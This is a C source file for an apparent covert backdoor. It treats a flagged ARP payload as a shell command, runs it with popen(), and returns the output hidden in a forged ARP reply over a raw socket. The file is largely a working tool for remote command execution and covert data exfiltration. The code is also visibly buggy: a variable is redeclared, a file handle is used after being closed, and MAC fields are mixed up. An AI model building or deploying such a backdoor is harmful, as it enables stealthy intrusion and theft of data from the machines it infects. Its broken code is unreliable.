#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/wait.h>
#include <net/if.h>
#include <netpacket/packet.h> // defined sockaddr_ll

#define ETH_ALEN 6
#define IP_ALEN 4

#define PACKET_LEN 65535
#define OUTPUT_BUF 1024
#define ARP_REPLY_OPCODE 2
#define IF_NAME "enp0s3" // FIXME: make this automatic
#define FLAG "\x70\x95\x05"


int get_my_mac(unsigned char mac[ETH_ALEN]){
    char filename[100];
    snprintf(filename, 100, "/sys/class/net/%s/address", IF_NAME);
    fprintf(stderr, "Attempting to open file: \"%s\"\n", filename);

    FILE *fp = fopen(filename, "r");
    if (fp == NULL){
        perror("Unable to open file");
        return -1;
    }

    // Buffer to store the MAC address string from the file
    char mac_str[18];
    if (fgets(mac_str, sizeof(mac_str), fp) == NULL) {
        perror("Failed to read MAC address");
        fclose(fp);
        return -1;
    }
    fclose(fp);

    // Array to store the MAC address in binary format
    if (sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) != 6) {
        fprintf(stderr, "Failed to parse MAC address\n");
        return -1;
    }
    // Print the MAC address in binary format for verification
    printf("get_my_mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    return 0;
}

int send_arp_reply(const char *iface, const char *src_mac_str, const char *src_ip_str,
                    const char *dst_mac_str, const char *dst_ip_str, const char *payload) {
    int sockfd;
    unsigned char packet[PACKET_LEN];
    struct sockaddr_ll sa;
    unsigned char src_mac[ETH_ALEN], dst_mac[ETH_ALEN];
    // Find mac for src
    if(get_my_mac(src_mac) != 0){
        return -1;
    }
    // Read src -> dst
    if (sscanf(src_mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &dst_mac[0], &dst_mac[1], &dst_mac[2], &dst_mac[3], &dst_mac[4], &dst_mac[5]) != 6) {
        fprintf(stderr, "Failed to parse MAC address\n");
        return -1;
    }
    struct in_addr src_ip, dst_ip;

    // Create raw socket
    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // Retrieve MAC and IP of the interface
    inet_aton(src_ip_str, &src_ip);
    inet_aton(dst_ip_str, &dst_ip);

    // Convert destination MAC address string to bytes
    sscanf(dst_mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &dst_mac[0], &dst_mac[1], &dst_mac[2],
           &dst_mac[3], &dst_mac[4], &dst_mac[5]);

    // Fill Ethernet header
    memcpy(packet, dst_mac, ETH_ALEN);                // Destination MAC
    memcpy(packet + ETH_ALEN, src_mac, ETH_ALEN);      // Source MAC
    packet[12] = ETH_P_ARP >> 8;
    packet[13] = ETH_P_ARP & 0xff;

    // Fill ARP header for a reply
    unsigned char *arp_header = packet + 14;
    arp_header[0] = 0x00;                            // Hardware type (Ethernet)
    arp_header[1] = 0x01;
    arp_header[2] = 0x08;                            // Protocol type (IP)
    arp_header[3] = 0x00;
    arp_header[4] = ETH_ALEN;                         // Hardware size
    arp_header[5] = IP_ALEN;                          // Protocol size
    arp_header[6] = ARP_REPLY_OPCODE >> 8;           // Opcode (ARP Reply)
    arp_header[7] = ARP_REPLY_OPCODE & 0xff;

    // ARP Payload for reply
    memcpy(arp_header + 8, src_mac, ETH_ALEN);        // Sender MAC address
    memcpy(arp_header + 14, &src_ip, IP_ALEN);        // Sender IP address
    memcpy(arp_header + 18, dst_mac, ETH_ALEN);       // Target MAC address
    memcpy(arp_header + 24, &dst_ip, IP_ALEN);        // Target IP address

    // Append custom payload if any
    size_t arp_packet_len = sizeof(struct ethhdr) + 28 + strlen(payload);
    memcpy(packet + sizeof(struct ethhdr) + 28, payload, strlen(payload));

    // Set up socket address structure
    memset(&sa, 0, sizeof(sa));
    sa.sll_ifindex = if_nametoindex(iface);
    sa.sll_halen = ETH_ALEN;
    memcpy(sa.sll_addr, dst_mac, ETH_ALEN);

    int status = 0;
    // Send the ARP reply packet
    if (sendto(sockfd, packet, arp_packet_len, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("sendto");
        status = errno;
    } else {
        printf("ARP reply sent to %s\n", dst_ip_str);
    }

    close(sockfd);
    return status;
}

volatile sig_atomic_t is_timed_out = 0;
void handle_alarm(int sig){
    is_timed_out = 1;
}
int execute_command_with_timeout(const char *command, int timeout, char *output, size_t output_size) {
    FILE *fp;
    size_t bytes_read = 0;

    // Setup alarm for timeout
    signal(SIGALRM, handle_alarm);
    alarm(timeout);

    fp = popen(command, "r");
    if (fp == NULL){
        perror("popen failed");
        return -1;
    }

    while (fgets(output + bytes_read, output_size - bytes_read, fp) != NULL) {
        bytes_read += strlen(output + bytes_read);
        if(bytes_read > output_size){
            break;
        }
        if (is_timed_out) {
            break;
        }
    }

    alarm(0);
    int status = pclose(fp);

    if(is_timed_out) {
        fprintf(stderr, "Command timed out\n");
        return -2;
    }

    return WEXITSTATUS(status);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        fprintf(stderr, "Usage: %s <src_hw> <src_proto> <dst_hw> <dst_proto> <payload>\n", argv[0]);
        return 1;
    }

    char *src_hw = argv[1];
    char *src_proto = argv[2];
    char *dst_hw = argv[3];
    char *dst_proto = argv[4];
    char *payload = argv[5];
    char *command = payload + strlen(FLAG);

    // Output the received ARP information
    FILE *fp = fopen("/tmp/arpk.log", "a+");
    fprintf(fp, "Received ARP request:\n");
    fprintf(fp, "Source MAC: %s\n", src_hw);
    fprintf(fp, "Source IP: %s\n", src_proto);
    fprintf(fp, "Destination MAC: %s\n", dst_hw);
    fprintf(fp, "Destination IP: %s\n", dst_proto);
    fprintf(fp, "Payload Length: %ld\n", strlen(command));
    fprintf(fp, "Payload: %s\n", command);
    fclose(fp);

    char output[OUTPUT_BUF+1];
    memset(output, 0, OUTPUT_BUF+1);
    int status = execute_command_with_timeout(command, 3, output, OUTPUT_BUF);
    output[OUTPUT_BUF] = 0;
    if (status == 0) {
        // Success, send output as reply
        fprintf(fp, "Success!\n\tCommand: %s\n\tOutput: %s\n", command, output);
        send_arp_reply(IF_NAME, src_hw, src_proto, dst_hw, dst_proto, output);
    } else {
        if (status == -2) {
            // Failed, send timeout as reply
            fprintf(fp, "Failed!\n\tCommand timed out.\n");
        } else {
            // Failed, send default reply
            fprintf(fp, "Unkown failure!\n\tSending default reply...\n");
        }

        output[0] = 0;
    }

    // Send ARP reply
    if(send_arp_reply(IF_NAME, src_hw, src_proto, dst_hw, dst_proto, output) != 0){
        // IDK, crash out ig
    }

    // Log to file
    FILE *fp = fopen("/tmp/arpk.log", "a+");
    fprintf(fp, "\tCommand: %s\n\tOutput: %s\n", command, output);
    fclose(fp);

    return 0;
}
